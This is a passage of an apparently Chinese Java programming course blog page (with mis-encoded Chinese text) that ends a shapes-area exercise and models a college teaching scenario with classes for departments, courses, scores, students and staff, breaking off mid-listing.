class="hljs-string">&quot;Triangle&#x27;s area:&quot;</span>  + s2.area());  <br>        System.out.println(<span class="hljs-string">&quot;Triangle&#x27;s area:&quot;</span>  + s2_2.area());  <br><br>        System.out.println(<span class="hljs-string">&quot;Rectangle&#x27;s area:&quot;</span> + s3.area());  <br>        System.out.println(<span class="hljs-string">&quot;Rectangle&#x27;s area:&quot;</span> + s3_2.area());  <br>        System.out.println(<span class="hljs-string">&quot;Rectangle&#x27;s area:&quot;</span> + s3_3.area());  <br><br>        System.out.println(<span class="hljs-string">&quot;Circle&#x27;s area:&quot;</span>    + s4.area());  <br>        System.out.println(<span class="hljs-string">&quot;Count:&quot;</span>   + Shape.ShapeCount());  <br><br>        System.out.println(<span class="hljs-string">&quot;æ€»å›¾å½¢å¯¹è±¡æ•°ç›®ï¼š&quot;</span> + Shape.ShapeCount());  <br>        System.out.println(<span class="hljs-string">&quot;Circleå¯¹è±¡æ•°ç›®ï¼š&quot;</span> + Circle.getCircleCount());  <br>        System.out.println(<span class="hljs-string">&quot;Rectangleå¯¹è±¡æ•°ç›®ï¼š&quot;</span> + Rectangle.getRectangleCount());  <br>        System.out.println(<span class="hljs-string">&quot;Triangleå¯¹è±¡æ•°ç›®ï¼š&quot;</span> + Circle.getCircleCount());  <br>        System.out.println(<span class="hljs-string">&quot;Squareå¯¹è±¡æ•°ç›®ï¼š&quot;</span> + Rectangle.getRectangleCount());  <br><br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>è¿è¡Œç»“æœï¼š</strong><br><img src="/2025/04/02/Java%E7%BD%91%E7%BB%9C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/file-20250403213338618.png"></p><h1 id="å»ºæ¨¡å®ç°"><a href="#å»ºæ¨¡å®ç°" class="headerlink" title="å»ºæ¨¡å®ç°"></a>å»ºæ¨¡å®ç°</h1><p>æŸå­¦é™¢æ•™å­¦åœºæ™¯ã€‚</p><ul><li>å­¦é™¢æœ‰é™¢é•¿ã€å†…è®¾è‹¥å¹²ç³»ã€å®éªŒä¸­å¿ƒåŠç ”ç©¶æ‰€ï¼›</li><li>æ¯ç³»æœ‰æ•™å¸ˆã€å­¦ç”Ÿã€è¯¾ç¨‹ï¼šæŒ‰æ•™å­¦æ–¹æ¡ˆç»„ç»‡æ•™å­¦æ´»åŠ¨ã€‚</li><li>æ•™å¸ˆï¼šè‹¥å¹²ï¼Œä¸»è¦å·¥ä½œæœ‰æ•™å­¦ï¼ˆæˆè¯¾å¸ƒç½®ä½œä¸šã€å‡ºè€ƒé¢˜ï¼‰ã€ç§‘ç ”ï¼ˆè¯¾é¢˜ç ”ç©¶ã€åº”ç”¨å¼€å‘ï¼‰ç­‰ï¼›</li><li>å­¦ç”Ÿï¼šæŒ‰ç­çº§ç»„ç»‡ï¼Œ ä¸»è¦å·¥ä½œæ˜¯ä¸Šè¯¾ã€å®Œæˆä½œä¸šã€å‚åŠ è€ƒè¯•ï¼›ä¹Ÿå¯ä»¥å‚ä¸ç§‘ç ”æˆ–æ‹…ä»»åŠ©æ•™ç­‰ï¼›</li><li>è¯¾ç¨‹æœ‰ç†è®ºè¯¾ã€å®ä¹ è¯¾ã€ä½“è‚²è¯¾ç­‰ã€‚</li></ul><p>ä½¿ç”¨javaç¨‹åºç»™ä¸Šè¿°åœºæ™¯å»ºæ¨¡å¹¶å®ç°ä»¥ä¸‹è®¡ç®—åŠŸèƒ½ï¼š<br>1ã€æŸé—¨è¯¾ç¨‹æ‰€æœ‰å­¦ç”Ÿæ€»åˆ†åŠå¹³å‡åˆ†ï¼›<br>2ã€æŸå­¦ç”Ÿæ‰€æœ‰è¯¾ç¨‹æˆç»©æ€»åˆ†åŠå¹³å‡åˆ†ï¼›<br>3ã€æŸæ•™å¸ˆæ‰€æ•™æˆçš„æ‰€æœ‰å­¦ç”Ÿäººæ•°ã€‚</p><h2 id="å®ç°ï¼š-1"><a href="#å®ç°ï¼š-1" class="headerlink" title="å®ç°ï¼š"></a>å®ç°ï¼š</h2><p><strong>é¡¹ç›®ç»“æ„</strong></p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">/src<br>|<span class="hljs-string">--/app</span><br><span class="hljs-string"></span>|<span class="hljs-string">  </span>|<span class="hljs-string">--Main</span><br><span class="hljs-string"></span>|<br>|<span class="hljs-string">--/college</span><br><span class="hljs-string"></span>|<span class="hljs-string">  </span>|<span class="hljs-string">--College</span><br><span class="hljs-string"></span>|<span class="hljs-string">  </span>|<span class="hljs-string">--Department</span><br><span class="hljs-string"></span>|<span class="hljs-string">  </span>|<span class="hljs-string">--LabCenter</span><br><span class="hljs-string"></span>|<span class="hljs-string">  </span>|<span class="hljs-string">--MyClass</span><br><span class="hljs-string"></span>|<span class="hljs-string">  </span>|<span class="hljs-string">--ResearchCenter</span><br><span class="hljs-string"></span>|<span class="hljs-string">  </span>|<span class="hljs-string">--Task</span><br><span class="hljs-string"></span>|<br>|<span class="hljs-string">--/course</span><br><span class="hljs-string"></span>|<span class="hljs-string">  </span>|<span class="hljs-string">--Course</span><br><span class="hljs-string"></span>|<span class="hljs-string">  </span>|<span class="hljs-string">--Score</span><br><span class="hljs-string"></span>|<br>|<span class="hljs-string">--/people</span><br><span class="hljs-string">   </span>|<span class="hljs-string">--Dean</span><br><span class="hljs-string">   </span>|<span class="hljs-string">--Person</span><br><span class="hljs-string">   </span>|<span class="hljs-string">--Student</span><br><span class="hljs-string">   </span>|<span class="hljs-string">--Teacher</span><br><span class="hljs-string">   </span>|<span class="hljs-string">--Dean</span><br></code></pre></td></tr></table></figure><p><strong>college&#x2F;College:</strong> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> college;  <br><br><span class="hljs-keyword">import</span> java.util.ArrayList;  <br><span class="hljs-keyword">import</span> people.Dean;  <br><br><span class="hljs-comment">//å­¦é™¢  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">College</span> &#123;  <br>    <span class="hljs-keyword">private</span> String name;  <br>    <span class="hljs-keyword">private</span> Dean dean;  <br>    <span class="hljs-keyword">private</span> ArrayList&lt;Department&gt; departments;  <span class="hljs-comment">// é™¢ç³»åˆ—è¡¨  </span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">College</span><span class="hljs-params">(String name)</span> &#123;  <br>        <span class="hljs-built_in">this</span>.name = name;  <br>        <span class="hljs-built_in">this</span>.dean = <span class="hljs-literal">null</span>;  <span class="hljs-comment">// åˆå§‹æ—¶é™¢é•¿ä¸ºç©º  </span><br>        <span class="hljs-built_in">this</span>.departments = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setDean</span><span class="hljs-params">(Dean dean)</span> &#123;  <br>        <span class="hljs-built_in">this</span>.dean = dean;  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> Dean <span class="hljs-title function_">getDean</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-keyword">return</span> dean;  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addDepartment</span><span class="hljs-params">(Department dept)</span> &#123;  <br>        departments.add(dept);  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-keyword">return</span> name;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>college&#x2F;Department:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> college;  <br><span class="hljs-keyword">import</span> java.util.ArrayList;  <br><span class="hljs-keyword">import</span> people.Teacher;  <br><span class="hljs-keyword">import</span> people.Student;  <br><span class="hljs-keyword">import</span> course.Course;  <br><br><span class="hljs-comment">//é™¢ç³»  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Department</span> &#123;  <br>    <span class="hljs-keyword">private</span> String name;  <br>    <span class="hljs-keyword">private</span> ArrayList&lt;Teacher&gt; teachers;  <br>    <span class="hljs-keyword">private</span> ArrayList&lt;Student&gt; students;  <br>    <span class="hljs-keyword">private</span> ArrayList&lt;Course&gt; courses;  <br>    <span class="hljs-keyword">private</span> ArrayList&lt;ResearchCenter&gt; researchCenters;  <br>    <span class="hljs-keyword">private</span> ArrayList&lt;LabCenter&gt; labCenters;  <br>    <span class="hljs-keyword">private</span> ArrayList&lt;MyClass&gt; myClasses;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Department</span><span class="hljs-params">(String name)</span> &#123;  <br>        <span class="hljs-built_in">this</span>.name = name;  <br>        <span class="hljs-built_in">this</span>.teachers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();  <br>        <span class="hljs-built_in">this</span>.students = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();  <br>        <span class="hljs-built_in">this</span>.courses = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();  <br>        <span class="hljs-built_in">this</span>.researchCenters = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();  <br>        <span class="hljs-built_in">this</span>.labCenters = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();  <br>        <span class="hljs-built_in">this</span>.myClasses = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addTeacher</span><span class="hljs-params">(Teacher teacher)</span> &#123;  <br>        teachers.add(teacher);  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addStudent</span><span class="hljs-params">(Student student)</span> &#123;  <br>        students.add(student);  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addCourse</span><span class="hljs-params">(Course course)</span> &#123;  <br>        courses.add(course);  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addresearchCenter</span><span class="hljs-params">(ResearchCenter researchCenter)</span>&#123;  <br>        researchCenters.add(researchCenter);  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addlabCenter</span><span class="hljs-params">(LabCenter labCenter)</span>&#123;  <br>        labCenters.add(labCenter);  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addClasses</span><span class="hljs-params">(MyClass myclass)</span>&#123;  <br>        myClasses.add(myclass);  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>college&#x2F;LabCenter:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> college;  <br><span class="hljs-keyword">import</span> java.util.ArrayList;  <br><span class="hljs-keyword">import</span> people.Teacher;  <br><span class="hljs-keyword">import</span> people.Student;  <br><br><span class="hljs-comment">//å®éªŒä¸­å¿ƒ  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LabCenter</span> &#123;  <br>    <span class="hljs-keyword">private</span> String name;  <br>    <span class="hljs-keyword">private</span> ArrayList&lt;Teacher&gt; teachers;  <br>    <span class="hljs-keyword">private</span> ArrayList&lt;Student&gt; students;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">LabCenter</span><span class="hljs-params">(String name)</span> &#123;  <br>        <span class="hljs-built_in">this</span>.name = name;  <br>        <span class="hljs-built_in">this</span>.teachers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();  <br>        <span class="hljs-built_in">this</span>.students = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addTeacher</span><span class="hljs-params">(Teacher teacher)</span> &#123;  <br>        teachers.add(teacher);  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addStudent</span><span class="hljs-params">(Student student)</span> &#123;  <br>        students.add(student);  <br>    &#125;  <br><br><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>college&#x2F;ReseachCenter:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// ç³»ï¼ˆé™¢ç³»ï¼‰ç±»  </span><br><span class="hljs-keyword">package</span> college;  <br><span class="hljs-keyword">import</span> java.util.ArrayList;  <br><span class="hljs-keyword">import</span> people.Teacher;  <br><span class="hljs-keyword">import</span> people.Student;  <br><span class="hljs-keyword">import</span> course.Course;  <br><br><span class="hljs-comment">//ç ”ç©¶æ‰€  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ResearchCenter</span> &#123;  <br>    <span class="hljs-keyword">private</span> String name;  <br>    <span class="hljs-keyword">private</span> ArrayList&lt;Teacher&gt; teachers;  <br>    <span class="hljs-keyword">private</span> ArrayList&lt;Student&gt; students;  <br>    <span class="hljs-keyword">private</span> ArrayList&lt;Task&gt; tasks;  <br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ResearchCenter</span><span class="hljs-params">(String name)</span> &#123;  <br>        <span class="hljs-built_in">this</span>.name = name;  <br>        <span class="hljs-built_in">this</span>.teachers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();  <br>        <span class="hljs-built_in">this</span>.students = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();  <br>        <span class="hljs-built_in">this</span>.tasks = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();  <br><br>    &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addTeacher</span><span class="hljs-params">(Teacher teacher)</span> &#123;  <br>        teachers.add(teacher);  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addStudent</span><span class="hljs-params">(Student student)</span> &#123;  <br>        students.add(student);  <br>    &#125;  <br><br>    <span class="hljs-comment">// æ·»åŠ ç ”ç©¶è¯¾é¢˜  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addTask</span><span class="hljs-params">(Task task)</span> &#123;  <br>        tasks.add(task);  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>college&#x2F;MyClass:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> college;  <br><span class="hljs-keyword">import</span> java.util.ArrayList;  <br><span class="hljs-keyword">import</span> people.Student;  <br><br><span class="hljs-comment">//ç­çº§  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span> &#123;  <br>    <span class="hljs-keyword">private</span> String name;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> id;  <br>    <span class="hljs-keyword">private</span> ArrayList&lt;Student&gt; students;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyClass</span><span class="hljs-params">(String name)</span> &#123;  <br>        <span class="hljs-built_in">this</span>.name = name;  <br>        <span class="hljs-built_in">this</span>.id = id;  <br>        <span class="hljs-built_in">this</span>.students = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addStudent</span><span class="hljs-params">(Student student)</span> &#123;  <br>        students.add(student);  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>college&#x2F;Task:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> college;  <br><br><span class="hljs-comment">//è¯¾é¢˜ä»»åŠ¡  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Task</span> &#123;  <br>    <span class="hljs-keyword">private</span> String description;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Task</span><span class="hljs-params">(String description)</span> &#123;  <br>        <span class="hljs-built_in">this</span>.description = description;  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getDescription</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-keyword">return</span> description;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>course&#x2F;Course:</strong> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> course;  <br><span class="hljs-keyword">import</span> java.util.ArrayList;  <br><span class="hljs-keyword">import</span> people.Student;  <br><br><span class="hljs-comment">//è¯¾ç¨‹  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Course</span> &#123;  <br>    <span class="hljs-keyword">private</span> String name;  <br>    <span class="hljs-keyword">private</span> ArrayList&lt;Student&gt; students;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Course</span><span class="hljs-params">(String name)</span> &#123;  <br>        <span class="hljs-built_in">this</span>.name = name;  <br>        <span class="hljs-built_in">this</span>.students = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addStudent</span><span class="hljs-params">(Student student)</span> &#123;  <br>        students.add(student);  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> ArrayList&lt;Student&gt; <span class="hljs-title function_">getStudents</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-keyword">return</span> students;  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getTotalScore</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-type">double</span> <span class="hljs-variable">total</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <br>        <span class="hljs-keyword">for</span> (Student student : students) &#123;  <br>            <span class="hljs-type">Score</span> <span class="hljs-variable">score</span> <span class="hljs-operator">=</span> student.getScores().get(<span class="hljs-built_in">this</span>);  <br>            <span class="hljs-keyword">if</span> (score != <span class="hljs-literal">null</span>) &#123;  <br>                total += score.getScore();  <br>            &#125;  <br>        &#125;  <br>        <span class="hljs-keyword">return</span> total;  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getAverageScore</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-keyword">if</span> (students.isEmpty()) &#123;  <br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <br>        &#125;  <br>        <span class="hljs-keyword">return</span> getTotalScore() / students.size();  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>course&#x2F;Score:</strong> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> course;  <br><br><span class="hljs-comment">//åˆ†æ•°  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Score</span> &#123;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> score;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Score</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-built_in">this</span>.score = <span class="hljs-number">0</span>;  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setScore</span><span class="hljs-params">(<span class="hljs-type">double</span> score)</span> &#123;  <br>        <span class="hljs-built_in">this</span>.score = score;  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getScore</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-keyword">return</span> score;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>people&#x2F;Person:</strong> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> people;  <br><br><span class="hljs-comment">//æŠ½è±¡ç±»  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;  <br>    <span class="hljs-keyword">protected</span> String name;  <br>    <span class="hljs-keyword">protected</span> <span class="hljs-type">int</span> id;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> id)</span> &#123;  <br>        <span class="hljs-built_in">this</span>.name = name;  <br>        <span class="hljs-built_in">this</span>.id = id;  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-keyword">return</span> name;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>people&#x2F;Dean:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> people;  <br><br><span class="hljs-comment">//é™¢é•¿  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Dean</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Person</span> &#123;  <br>    <span class="hljs-keyword">private</span> String name;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Dean</span><span class="hljs-params">(String name,<span class="hljs-type">int</span> id)</span> &#123;  <br>        <span class="hljs-built_in">super</span>(name,id);  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-keyword">return</span> name;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>people&#x2F;Student:</strong> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 